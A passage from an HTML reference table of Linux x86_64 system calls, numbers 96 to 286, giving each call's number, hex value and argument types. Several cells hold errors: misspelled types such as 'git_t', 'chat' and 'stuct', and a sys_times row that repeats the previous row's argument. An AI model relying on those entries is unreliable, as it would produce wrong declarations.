mask</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>96</td><td>sys_gettimeofday</td><td>0x60</td><td>struct  timeval *tv</td><td>struct  timezone *tz</td><td></td><td></td><td></td><td></td></tr><tr><td>97</td><td>sys_getrlimit</td><td>0x61</td><td>unsigned  int resource</td><td>struct  rlimit *rlim</td><td></td><td></td><td></td><td></td></tr><tr><td>98</td><td>sys_getrusage</td><td>0x62</td><td>int  who</td><td>struct  rusage *ru</td><td></td><td></td><td></td><td></td></tr><tr><td>99</td><td>sys_sysinfo</td><td>0x63</td><td>struct  sysinfo *info</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>100</td><td>sys_times</td><td>0x64</td><td>struct  sysinfo *info</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>101</td><td>sys_ptrace</td><td>0x65</td><td>long  request</td><td>long  pid</td><td>unsigned  long addr</td><td>unsigned  long data</td><td></td><td></td></tr><tr><td>102</td><td>sys_getuid</td><td>0x66</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>103</td><td>sys_syslog</td><td>0x67</td><td>int  type</td><td>char  *buf</td><td>int  len</td><td></td><td></td><td></td></tr><tr><td>104</td><td>sys_getgid</td><td>0x68</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>105</td><td>sys_setuid</td><td>0x69</td><td>uid_t  uid</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>106</td><td>sys_setgid</td><td>0x6A</td><td>git_t  gid</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>107</td><td>sys_geteuid</td><td>0x6B</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>108</td><td>sys_getegid</td><td>0x6C</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>109</td><td>sys_setpgid</td><td>0x6D</td><td>pid_t  pid</td><td>pid_t  pgid</td><td></td><td></td><td></td><td></td></tr><tr><td>110</td><td>sys_getppid</td><td>0x6E</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>111</td><td>sys_getpgrp</td><td>0x6F</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>112</td><td>sys_setsid</td><td>0x70</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>113</td><td>sys_setreuid</td><td>0x71</td><td>uid_t  ruid</td><td>uid_t  euid</td><td></td><td></td><td></td><td></td></tr><tr><td>114</td><td>sys_setregid</td><td>0x72</td><td>git_t  rgid</td><td>gid_t  egid</td><td></td><td></td><td></td><td></td></tr><tr><td>115</td><td>sys_getgroups</td><td>0x73</td><td>int  gidsetsize</td><td>gid_t  *grouplist</td><td></td><td></td><td></td><td></td></tr><tr><td>116</td><td>sys_setgroups</td><td>0x74</td><td>int  gidsetsize</td><td>gid_t  *grouplist</td><td></td><td></td><td></td><td></td></tr><tr><td>117</td><td>sys_setresuid</td><td>0x75</td><td>uid_t  *ruid</td><td>uid_t  *euid</td><td>uid_t  *suid</td><td></td><td></td><td></td></tr><tr><td>118</td><td>sys_getresuid</td><td>0x76</td><td>uid_t  *ruid</td><td>uid_t  *euid</td><td>uid_t  *suid</td><td></td><td></td><td></td></tr><tr><td>119</td><td>sys_setresgid</td><td>0x77</td><td>gid_t  rgid</td><td>gid_t  egid</td><td>gid_t  sgid</td><td></td><td></td><td></td></tr><tr><td>120</td><td>sys_getresgid</td><td>0x78</td><td>git_t  *rgid</td><td>git_t  *egid</td><td>git_t  *sgid</td><td></td><td></td><td></td></tr><tr><td>121</td><td>sys_getpgid</td><td>0x79</td><td>pid_t  pid</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>122</td><td>sys_setfsuid</td><td>0x7A</td><td>uid_t  uid</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>123</td><td>sys_setfsgid</td><td>0x7B</td><td>gid_t  gid</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>124</td><td>sys_getsid</td><td>0x7C</td><td>pid_t  pid</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>125</td><td>sys_capget</td><td>0x7D</td><td>cap_user_header_t  header</td><td>cap_user_data_t  dataptr</td><td></td><td></td><td></td><td></td></tr><tr><td>126</td><td>sys_capset</td><td>0x7E</td><td>cap_user_header_t  header</td><td>const  cap_user_data_t data</td><td></td><td></td><td></td><td></td></tr><tr><td>127</td><td>sys_rt_sigpending</td><td>0x7F</td><td>sigset_t  *set</td><td>size_t  sigsetsize</td><td></td><td></td><td></td><td></td></tr><tr><td>128</td><td>sys_rt_sigtimedwait</td><td>0x80</td><td>const  sigset_t *uthese</td><td>siginfo_t  *uinfo</td><td>const  struct timespec *uts</td><td>size_t  sigsetsize</td><td></td><td></td></tr><tr><td>129</td><td>sys_rt_sigqueueinfo</td><td>0x81</td><td>pid_t  pid</td><td>int  sig</td><td>siginfo_t  *uinfo</td><td></td><td></td><td></td></tr><tr><td>130</td><td>sys_rt_sigsuspend</td><td>0x82</td><td>sigset_t  *unewset</td><td>size_t  sigsetsize</td><td></td><td></td><td></td><td></td></tr><tr><td>131</td><td>sys_sigaltstack</td><td>0x83</td><td>const  stack_t *uss</td><td>stack_t  *uoss</td><td></td><td></td><td></td><td></td></tr><tr><td>132</td><td>sys_utime</td><td>0x84</td><td>char  *filename</td><td>struct  utimbuf *times</td><td></td><td></td><td></td><td></td></tr><tr><td>133</td><td>sys_mknod</td><td>0x85</td><td>const  char *filename</td><td>int  mode</td><td>unsigned  dev</td><td></td><td></td><td></td></tr><tr><td>134</td><td>sys_uselib</td><td>0x86</td><td>NOT  IMPLEMENTED</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>135</td><td>sys_personality</td><td>0x87</td><td>unsigned  int personality</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>136</td><td>sys_ustat</td><td>0x88</td><td>unsigned  dev</td><td>struct  ustat *ubuf</td><td></td><td></td><td></td><td></td></tr><tr><td>137</td><td>sys_statfs</td><td>0x89</td><td>const  char *pathname</td><td>struct  statfs *buf</td><td></td><td></td><td></td><td></td></tr><tr><td>138</td><td>sys_fstatfs</td><td>0x8A</td><td>unsigned  int fd</td><td>struct  statfs *buf</td><td></td><td></td><td></td><td></td></tr><tr><td>139</td><td>sys_sysfs</td><td>0x8B</td><td>int  option</td><td>unsigned  long arg1</td><td>unsigned  long arg2</td><td></td><td></td><td></td></tr><tr><td>140</td><td>sys_getpriority</td><td>0x8C</td><td>int  which</td><td>int  who</td><td></td><td></td><td></td><td></td></tr><tr><td>141</td><td>sys_setpriority</td><td>0x8D</td><td>int  which</td><td>int  who</td><td>int  niceval</td><td></td><td></td><td></td></tr><tr><td>142</td><td>sys_sched_setparam</td><td>0x8E</td><td>pid_t  pid</td><td>struct  sched_param *param</td><td></td><td></td><td></td><td></td></tr><tr><td>143</td><td>sys_sched_getparam</td><td>0x8F</td><td>pid_t  pid</td><td>struct  sched_param *param</td><td></td><td></td><td></td><td></td></tr><tr><td>144</td><td>sys_sched_setscheduler</td><td>0x90</td><td>pid_t  pid</td><td>int  policy</td><td>struct  sched_param *param</td><td></td><td></td><td></td></tr><tr><td>145</td><td>sys_sched_getscheduler</td><td>0x91</td><td>pid_t  pid</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>146</td><td>sys_sched_get_priority_max</td><td>0x92</td><td>int  policy</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>147</td><td>sys_sched_get_priority_min</td><td>0x93</td><td>int  policy</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>148</td><td>sys_sched_rr_get_interval</td><td>0x94</td><td>pid_t  pid</td><td>struct  timespec *interval</td><td></td><td></td><td></td><td></td></tr><tr><td>149</td><td>sys_mlock</td><td>0x95</td><td>unsigned  long start</td><td>size_t  len</td><td></td><td></td><td></td><td></td></tr><tr><td>150</td><td>sys_munlock</td><td>0x96</td><td>unsigned  long start</td><td>size_t  len</td><td></td><td></td><td></td><td></td></tr><tr><td>151</td><td>sys_mlockall</td><td>0x97</td><td>int  flags</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>152</td><td>sys_munlockall</td><td>0x98</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>153</td><td>sys_vhangup</td><td>0x99</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>154</td><td>sys_modify_ldt</td><td>0x9A</td><td>int  func</td><td>void  *ptr</td><td>unsigned  long bytecount</td><td></td><td></td><td></td></tr><tr><td>155</td><td>sys_pivot_root</td><td>0x9B</td><td>const  char *new_root</td><td>const  char *put_old</td><td></td><td></td><td></td><td></td></tr><tr><td>156</td><td>sys__sysctl</td><td>0x9C</td><td>struct  __sysctl_args *args</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>157</td><td>sys_prctl</td><td>0x9D</td><td>int  option</td><td>unsigned  long arg2</td><td>unsigned  long arg3</td><td>unsigned  long arg4</td><td>unsigned  long arg5</td><td></td></tr><tr><td>158</td><td>sys_arch_prctl</td><td>0x9E</td><td>struct  task_struct *task</td><td>int  code</td><td>unsigned  long *addr</td><td></td><td></td><td></td></tr><tr><td>159</td><td>sys_adjtimex</td><td>0x9F</td><td>struct  timex *txc_p</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>160</td><td>sys_setrlimit</td><td>0xA0</td><td>unsigned  int resource</td><td>struct  rlimit *rlim</td><td></td><td></td><td></td><td></td></tr><tr><td>161</td><td>sys_chroot</td><td>0xA1</td><td>const  char *filename</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>162</td><td>sys_sync</td><td>0xA2</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>163</td><td>sys_acct</td><td>0xA3</td><td>const  char *name</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>164</td><td>sys_settimeofday</td><td>0xA4</td><td>struct  timeval *tv</td><td>struct  timezone *tz</td><td></td><td></td><td></td><td></td></tr><tr><td>165</td><td>sys_mount</td><td>0xA5</td><td>char  *dev_name</td><td>char  *dir_name</td><td>char  *type</td><td>unsigned  long flags</td><td>void  *data</td><td></td></tr><tr><td>166</td><td>sys_umount2</td><td>0xA6</td><td>const  char *target</td><td>int  flags</td><td></td><td></td><td></td><td></td></tr><tr><td>167</td><td>sys_swapon</td><td>0xA7</td><td>const  char *specialfile</td><td>int  swap_flags</td><td></td><td></td><td></td><td></td></tr><tr><td>168</td><td>sys_swapoff</td><td>0xA8</td><td>const  char *specialfile</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>169</td><td>sys_reboot</td><td>0xA9</td><td>int  magic1</td><td>int  magic2</td><td>unsigned  int cmd</td><td>void  *arg</td><td></td><td></td></tr><tr><td>170</td><td>sys_sethostname</td><td>0xAA</td><td>char  *name</td><td>int  len</td><td></td><td></td><td></td><td></td></tr><tr><td>171</td><td>sys_setdomainname</td><td>0xAB</td><td>char  *name</td><td>int  len</td><td></td><td></td><td></td><td></td></tr><tr><td>172</td><td>sys_iopl</td><td>0xAC</td><td>unsigned  int level</td><td>struct  pt_regs *regs</td><td></td><td></td><td></td><td></td></tr><tr><td>173</td><td>sys_ioperm</td><td>0xAD</td><td>unsigned  long from</td><td>unsigned  long num</td><td>int  turn_on</td><td></td><td></td><td></td></tr><tr><td>174</td><td>sys_create_module</td><td>0xAE</td><td>REMOVED  IN Linux 2.6</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>175</td><td>sys_init_module</td><td>0xAF</td><td>void  *umod</td><td>unsigned  long len</td><td>const  char *uargs</td><td></td><td></td><td></td></tr><tr><td>176</td><td>sys_delete_module</td><td>0xB0</td><td>const  chat *name_user</td><td>unsigned  int flags</td><td></td><td></td><td></td><td></td></tr><tr><td>177</td><td>sys_get_kernel_syms</td><td>0xB1</td><td>REMOVED  IN Linux 2.6</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>178</td><td>sys_query_module</td><td>0xB2</td><td>REMOVED  IN Linux 2.6</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>179</td><td>sys_quotactl</td><td>0xB3</td><td>unsigned  int cmd</td><td>const  char *special</td><td>qid_t  id</td><td>void  *addr</td><td></td><td></td></tr><tr><td>180</td><td>sys_nfsservctl</td><td>0xB4</td><td>NOT  IMPLEMENTED</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>181</td><td>sys_getpmsg</td><td>0xB5</td><td>NOT  IMPLEMENTED</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>182</td><td>sys_putpmsg</td><td>0xB6</td><td>NOT  IMPLEMENTED</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>183</td><td>sys_afs_syscall</td><td>0xB7</td><td>NOT  IMPLEMENTED</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>184</td><td>sys_tuxcall</td><td>0xB8</td><td>NOT  IMPLEMENTED</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>185</td><td>sys_security</td><td>0xB9</td><td>NOT  IMPLEMENTED</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>186</td><td>sys_gettid</td><td>0xBA</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>187</td><td>sys_readahead</td><td>0xBB</td><td>int  fd</td><td>loff_t  offset</td><td>size_t  count</td><td></td><td></td><td></td></tr><tr><td>188</td><td>sys_setxattr</td><td>0xBC</td><td>const  char *pathname</td><td>const  char *name</td><td>const  void *value</td><td>size_t  size</td><td>int  flags</td><td></td></tr><tr><td>189</td><td>sys_lsetxattr</td><td>0xBD</td><td>const  char *pathname</td><td>const  char *name</td><td>const  void *value</td><td>size_t  size</td><td>int  flags</td><td></td></tr><tr><td>190</td><td>sys_fsetxattr</td><td>0xBE</td><td>int  fd</td><td>const  char *name</td><td>const  void *value</td><td>size_t  size</td><td>int  flags</td><td></td></tr><tr><td>191</td><td>sys_getxattr</td><td>0xBF</td><td>const  char *pathname</td><td>const  char *name</td><td>void  *value</td><td>size_t  size</td><td></td><td></td></tr><tr><td>192</td><td>sys_lgetxattr</td><td>0xC0</td><td>const  char *pathname</td><td>const  char *name</td><td>void  *value</td><td>size_t  size</td><td></td><td></td></tr><tr><td>193</td><td>sys_fgetxattr</td><td>0xC1</td><td>int  fd</td><td>const  har *name</td><td>void  *value</td><td>size_t  size</td><td></td><td></td></tr><tr><td>194</td><td>sys_listxattr</td><td>0xC2</td><td>const  char *pathname</td><td>char  *list</td><td>size_t  size</td><td></td><td></td><td></td></tr><tr><td>195</td><td>sys_llistxattr</td><td>0xC3</td><td>const  char *pathname</td><td>char  *list</td><td>size_t  size</td><td></td><td></td><td></td></tr><tr><td>196</td><td>sys_flistxattr</td><td>0xC4</td><td>int  fd</td><td>char  *list</td><td>size_t  size</td><td></td><td></td><td></td></tr><tr><td>197</td><td>sys_removexattr</td><td>0xC5</td><td>const  char *pathname</td><td>const  char *name</td><td></td><td></td><td></td><td></td></tr><tr><td>198</td><td>sys_lremovexattr</td><td>0xC6</td><td>const  char *pathname</td><td>const  char *name</td><td></td><td></td><td></td><td></td></tr><tr><td>199</td><td>sys_fremovexattr</td><td>0xC7</td><td>int  fd</td><td>const  char *name</td><td></td><td></td><td></td><td></td></tr><tr><td>200</td><td>sys_tkill</td><td>0xC8</td><td>pid_t  pid</td><td>ing  sig</td><td></td><td></td><td></td><td></td></tr><tr><td>201</td><td>sys_time</td><td>0xC9</td><td>time_t  *tloc</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>202</td><td>sys_futex</td><td>0xCA</td><td>u32  *uaddr</td><td>int  op</td><td>u32  val</td><td>struct  timespec *utime</td><td>u32  *uaddr2</td><td>u32  val3</td></tr><tr><td>203</td><td>sys_sched_setaffinity</td><td>0xCB</td><td>pid_t  pid</td><td>unsigned  int len</td><td>unsigned  long *user_mask_ptr</td><td></td><td></td><td></td></tr><tr><td>204</td><td>sys_sched_getaffinity</td><td>0xCC</td><td>pid_t  pid</td><td>unsigned  int len</td><td>unsigned  long *user_mask_ptr</td><td></td><td></td><td></td></tr><tr><td>205</td><td>sys_set_thread_area</td><td>0xCD</td><td>NOT  IMPLEMENTED. Use arch_prctl</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>206</td><td>sys_io_setup</td><td>0xCE</td><td>unsigned  nr_events</td><td>aio_context_t  *ctxp</td><td></td><td></td><td></td><td></td></tr><tr><td>207</td><td>sys_io_destroy</td><td>0xCF</td><td>aio_context_t  ctx</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>208</td><td>sys_io_getevents</td><td>0xD0</td><td>aio_context_t  ctx_id</td><td>long  min_nr</td><td>long  nr</td><td>struct  io_event *events</td><td></td><td></td></tr><tr><td>209</td><td>sys_io_submit</td><td>0xD1</td><td>aio_context_t  ctx_id</td><td>long  nr</td><td>struct  iocb **iocbpp</td><td></td><td></td><td></td></tr><tr><td>210</td><td>sys_io_cancel</td><td>0xD2</td><td>aio_context_t  ctx_id</td><td>struct  iocb *iocb</td><td>struct  io_event *result</td><td></td><td></td><td></td></tr><tr><td>211</td><td>sys_get_thread_area</td><td>0xD3</td><td>NOT  IMPLEMENTED. Use arch_prctl</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>212</td><td>sys_lookup_dcookie</td><td>0xD4</td><td>u64  cookie64</td><td>long  buf</td><td>long  len</td><td></td><td></td><td></td></tr><tr><td>213</td><td>sys_epoll_create</td><td>0xD5</td><td>int  size</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>214</td><td>sys_epoll_ctl_old</td><td>0xD6</td><td>NOT  IMPLEMENTED</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>215</td><td>sys_epoll_wait_old</td><td>0xD7</td><td>NOT  IMPLEMENTED</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>216</td><td>sys_remap_file_pages</td><td>0xD8</td><td>unsigned  long start</td><td>unsigned  long size</td><td>unsigned  long prot</td><td>unsigned  long pgoff</td><td>unsigned  long flags</td><td></td></tr><tr><td>217</td><td>sys_getdents64</td><td>0xD9</td><td>unsigned  int fd</td><td>struct  linux_dirent64 *dirent</td><td>unsigned  int count</td><td></td><td></td><td></td></tr><tr><td>218</td><td>sys_set_tid_address</td><td>0xDA</td><td>int  *tidptr</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>219</td><td>sys_restart_syscall</td><td>0xDB</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>220</td><td>sys_semtimedop</td><td>0xDC</td><td>int  semid</td><td>struct  sembuf *tsops</td><td>unsigned  nsops</td><td>const  struct timespec *timeout</td><td></td><td></td></tr><tr><td>221</td><td>sys_fadvise64</td><td>0xDD</td><td>int  fd</td><td>loff_t  offset</td><td>size_t  len</td><td>int  advice</td><td></td><td></td></tr><tr><td>222</td><td>sys_timer_create</td><td>0xDE</td><td>const  clockid_t which_clock</td><td>struct  sigevent *timer_event_spec</td><td>timer_t  *created_timer_id</td><td></td><td></td><td></td></tr><tr><td>223</td><td>sys_timer_settime</td><td>0xDF</td><td>timer_t  timer_id</td><td>int  flags</td><td>const  struct itimerspec *new_setting</td><td>struct  itimerspec *old_setting</td><td></td><td></td></tr><tr><td>224</td><td>sys_timer_gettime</td><td>0xE0</td><td>timer_t  timer_id</td><td>struct  itimerspec *setting</td><td></td><td></td><td></td><td></td></tr><tr><td>225</td><td>sys_timer_getoverrun</td><td>0xE1</td><td>timer_t  timer_id</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>226</td><td>sys_timer_delete</td><td>0xE2</td><td>timer_t  timer_id</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>227</td><td>sys_clock_settime</td><td>0xE3</td><td>const  clockid_t which_clock</td><td>const  struct timespec *tp</td><td></td><td></td><td></td><td></td></tr><tr><td>228</td><td>sys_clock_gettime</td><td>0xE4</td><td>const  clockid_t which_clock</td><td>struct  timespec *tp</td><td></td><td></td><td></td><td></td></tr><tr><td>229</td><td>sys_clock_getres</td><td>0xE5</td><td>const  clockid_t which_clock</td><td>struct  timespec *tp</td><td></td><td></td><td></td><td></td></tr><tr><td>230</td><td>sys_clock_nanosleep</td><td>0xE6</td><td>const  clockid_t which_clock</td><td>int  flags</td><td>const  struct timespec *rqtp</td><td>struct  timespec *rmtp</td><td></td><td></td></tr><tr><td>231</td><td>sys_exit_group</td><td>0xE7</td><td>int  error_code</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>232</td><td>sys_epoll_wait</td><td>0xE8</td><td>int  epfd</td><td>struct  epoll_event *events</td><td>int  maxevents</td><td>int  timeout</td><td></td><td></td></tr><tr><td>233</td><td>sys_epoll_ctl</td><td>0xE9</td><td>int  epfd</td><td>int  op</td><td>int  fd</td><td>struct  epoll_event *event</td><td></td><td></td></tr><tr><td>234</td><td>sys_tgkill</td><td>0xEA</td><td>pid_t  tgid</td><td>pid_t  pid</td><td>int  sig</td><td></td><td></td><td></td></tr><tr><td>235</td><td>sys_utimes</td><td>0xEB</td><td>char  *filename</td><td>struct  timeval *utimes</td><td></td><td></td><td></td><td></td></tr><tr><td>236</td><td>sys_vserver</td><td>0xEC</td><td>NOT  IMPLEMENTED</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>237</td><td>sys_mbind</td><td>0xED</td><td>unsigned  long start</td><td>unsigned  long len</td><td>unsigned  long mode</td><td>unsigned  long *nmask</td><td>unsigned  long maxnode</td><td>unsigned  flags</td></tr><tr><td>238</td><td>sys_set_mempolicy</td><td>0xEE</td><td>int  mode</td><td>unsigned  long *nmask</td><td>unsigned  long maxnode</td><td></td><td></td><td></td></tr><tr><td>239</td><td>sys_get_mempolicy</td><td>0xEF</td><td>int  *policy</td><td>unsigned  long *nmask</td><td>unsigned  long maxnode</td><td>unsigned  long addr</td><td>unsigned  long flags</td><td></td></tr><tr><td>240</td><td>sys_mq_open</td><td>0xF0</td><td>const  char *u_name</td><td>int  oflag</td><td>mode_t  mode</td><td>struct  mq_attr *u_attr</td><td></td><td></td></tr><tr><td>241</td><td>sys_mq_unlink</td><td>0xF1</td><td>const  char *u_name</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>242</td><td>sys_mq_timedsend</td><td>0xF2</td><td>mqd_t  mqdes</td><td>const  char *u_msg_ptr</td><td>size_t  msg_len</td><td>unsigned  int msg_prio</td><td>const  stuct timespec *u_abs_timeout</td><td></td></tr><tr><td>243</td><td>sys_mq_timedreceive</td><td>0xF3</td><td>mqd_t  mqdes</td><td>char  *u_msg_ptr</td><td>size_t  msg_len</td><td>unsigned  int *u_msg_prio</td><td>const  struct timespec *u_abs_timeout</td><td></td></tr><tr><td>244</td><td>sys_mq_notify</td><td>0xF4</td><td>mqd_t  mqdes</td><td>const  struct sigevent *u_notification</td><td></td><td></td><td></td><td></td></tr><tr><td>245</td><td>sys_mq_getsetattr</td><td>0xF5</td><td>mqd_t  mqdes</td><td>const  struct mq_attr *u_mqstat</td><td>struct  mq_attr *u_omqstat</td><td></td><td></td><td></td></tr><tr><td>246</td><td>sys_kexec_load</td><td>0xF6</td><td>unsigned  long entry</td><td>unsigned  long nr_segments</td><td>struct  kexec_segment *segments</td><td>unsigned  long flags</td><td></td><td></td></tr><tr><td>247</td><td>sys_waitid</td><td>0xF7</td><td>int  which</td><td>pid_t  upid</td><td>struct  siginfo *infop</td><td>int  options</td><td>struct  rusage *ru</td><td></td></tr><tr><td>248</td><td>sys_add_key</td><td>0xF8</td><td>const  char *_type</td><td>const  char *_description</td><td>const  void *_payload</td><td>size_t  plen</td><td></td><td></td></tr><tr><td>249</td><td>sys_request_key</td><td>0xF9</td><td>const  char *_type</td><td>const  char *_description</td><td>const  char *_callout_info</td><td>key_serial_t  destringid</td><td></td><td></td></tr><tr><td>250</td><td>sys_keyctl</td><td>0xFA</td><td>int  option</td><td>unsigned  long arg2</td><td>unsigned  long arg3</td><td>unsigned  long arg4</td><td>unsigned  long arg5</td><td></td></tr><tr><td>251</td><td>sys_ioprio_set</td><td>0xFB</td><td>int  which</td><td>int  who</td><td>int  ioprio</td><td></td><td></td><td></td></tr><tr><td>252</td><td>sys_ioprio_get</td><td>0xFC</td><td>int  which</td><td>int  who</td><td></td><td></td><td></td><td></td></tr><tr><td>253</td><td>sys_inotify_init</td><td>0xFD</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>254</td><td>sys_inotify_add_watch</td><td>0xFE</td><td>int  fd</td><td>const  char *pathname</td><td>u32  mask</td><td></td><td></td><td></td></tr><tr><td>255</td><td>sys_inotify_rm_watch</td><td>0xFF</td><td>int  fd</td><td>__s32  wd</td><td></td><td></td><td></td><td></td></tr><tr><td>256</td><td>sys_migrate_pages</td><td>0x100</td><td>pid_t  pid</td><td>unsigned  long maxnode</td><td>const  unsigned long *old_nodes</td><td>const  unsigned long *new_nodes</td><td></td><td></td></tr><tr><td>257</td><td>sys_openat</td><td>0x101</td><td>int  dfd</td><td>const  char *filename</td><td>int  flags</td><td>int  mode</td><td></td><td></td></tr><tr><td>258</td><td>sys_mkdirat</td><td>0x102</td><td>int  dfd</td><td>const  char *pathname</td><td>int  mode</td><td></td><td></td><td></td></tr><tr><td>259</td><td>sys_mknodat</td><td>0x103</td><td>int  dfd</td><td>const  char *filename</td><td>int  mode</td><td>unsigned  dev</td><td></td><td></td></tr><tr><td>260</td><td>sys_fchownat</td><td>0x104</td><td>int  dfd</td><td>const  char *filename</td><td>uid_t  user</td><td>gid_t  group</td><td>int  flag</td><td></td></tr><tr><td>261</td><td>sys_futimesat</td><td>0x105</td><td>int  dfd</td><td>const  char *filename</td><td>struct  timeval *utimes</td><td></td><td></td><td></td></tr><tr><td>262</td><td>sys_newfstatat</td><td>0x106</td><td>int  dfd</td><td>const  char *filename</td><td>struct  stat *statbuf</td><td>int  flag</td><td></td><td></td></tr><tr><td>263</td><td>sys_unlinkat</td><td>0x107</td><td>int  dfd</td><td>const  char *pathname</td><td>int  flag</td><td></td><td></td><td></td></tr><tr><td>264</td><td>sys_renameat</td><td>0x108</td><td>int  oldfd</td><td>const  char *oldname</td><td>int  newfd</td><td>const  char *newname</td><td></td><td></td></tr><tr><td>265</td><td>sys_linkat</td><td>0x109</td><td>int  oldfd</td><td>const  char *oldname</td><td>int  newfd</td><td>const  char *newname</td><td>int  flags</td><td></td></tr><tr><td>266</td><td>sys_symlinkat</td><td>0x10A</td><td>const  char *oldname</td><td>int  newfd</td><td>const  char *newname</td><td></td><td></td><td></td></tr><tr><td>267</td><td>sys_readlinkat</td><td>0x10B</td><td>int  dfd</td><td>const  char *pathname</td><td>char  *buf</td><td>int  bufsiz</td><td></td><td></td></tr><tr><td>268</td><td>sys_fchmodat</td><td>0x10C</td><td>int  dfd</td><td>const  char *filename</td><td>mode_t  mode</td><td></td><td></td><td></td></tr><tr><td>269</td><td>sys_faccessat</td><td>0x10D</td><td>int  dfd</td><td>const  char *filename</td><td>int  mode</td><td></td><td></td><td></td></tr><tr><td>270</td><td>sys_pselect6</td><td>0x10E</td><td>int  n</td><td>fd_set  *inp</td><td>fd_set  *outp</td><td>fd_set  *exp</td><td>struct  timespec *tsp</td><td>void  *sig</td></tr><tr><td>271</td><td>sys_ppoll</td><td>0x10F</td><td>struct  pollfd *ufds</td><td>unsigned  int nfds</td><td>struct  timespec *tsp</td><td>const  sigset_t *sigmask</td><td>size_t  sigsetsize</td><td></td></tr><tr><td>272</td><td>sys_unshare</td><td>0x110</td><td>unsigned  long unshare_flags</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>273</td><td>sys_set_robust_list</td><td>0x111</td><td>struct  robust_list_head *head</td><td>size_t  len</td><td></td><td></td><td></td><td></td></tr><tr><td>274</td><td>sys_get_robust_list</td><td>0x112</td><td>int  pid</td><td>struct  robust_list_head **head_ptr</td><td>size_t  *len_ptr</td><td></td><td></td><td></td></tr><tr><td>275</td><td>sys_splice</td><td>0x113</td><td>int  fd_in</td><td>loff_t  *off_in</td><td>int  fd_out</td><td>loff_t  *off_out</td><td>size_t  len</td><td>unsigned  int flags</td></tr><tr><td>276</td><td>sys_tee</td><td>0x114</td><td>int  fdin</td><td>int  fdout</td><td>size_t  len</td><td>unsigned  int flags</td><td></td><td></td></tr><tr><td>277</td><td>sys_sync_file_range</td><td>0x115</td><td>long  fd</td><td>loff_t  offset</td><td>loff_t  bytes</td><td>long  flags</td><td></td><td></td></tr><tr><td>278</td><td>sys_vmsplice</td><td>0x116</td><td>int  fd</td><td>const  struct iovec *iov</td><td>unsigned  long nr_segs</td><td>unsigned  int flags</td><td></td><td></td></tr><tr><td>279</td><td>sys_move_pages</td><td>0x117</td><td>pid_t  pid</td><td>unsigned  long nr_pages</td><td>const  void **pages</td><td>const  int *nodes</td><td>int  *status</td><td>int  flags</td></tr><tr><td>280</td><td>sys_utimensat</td><td>0x118</td><td>int  dfd</td><td>const  char *filename</td><td>struct  timespec *utimes</td><td>int  flags</td><td></td><td></td></tr><tr><td>281</td><td>sys_epoll_pwait</td><td>0x119</td><td>int  epfd</td><td>struct  epoll_event *events</td><td>int  maxevents</td><td>int  timeout</td><td>const  sigset_t *sigmask</td><td>size_t  sigsetsize</td></tr><tr><td>282</td><td>sys_signalfd</td><td>0x11A</td><td>int  ufd</td><td>sigset_t  *user_mask</td><td>size_t  sizemask</td><td></td><td></td><td></td></tr><tr><td>283</td><td>sys_timerfd_create</td><td>0x11B</td><td>int  clockid</td><td>int  flags</td><td></td><td></td><td></td><td></td></tr><tr><td>284</td><td>sys_eventfd</td><td>0x11C</td><td>unsigned  int count</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>285</td><td>sys_fallocate</td><td>0x11D</td><td>long  fd</td><td>long  mode</td><td>loff_t  offset</td><td>loff_t  len</td><td></td><td></td></tr><tr><td>286</td><td>sys_timerfd_settime</td><td>0x11E</td><td>int  ufd</td><td>int  flags</td><td>const  struct itimerspec 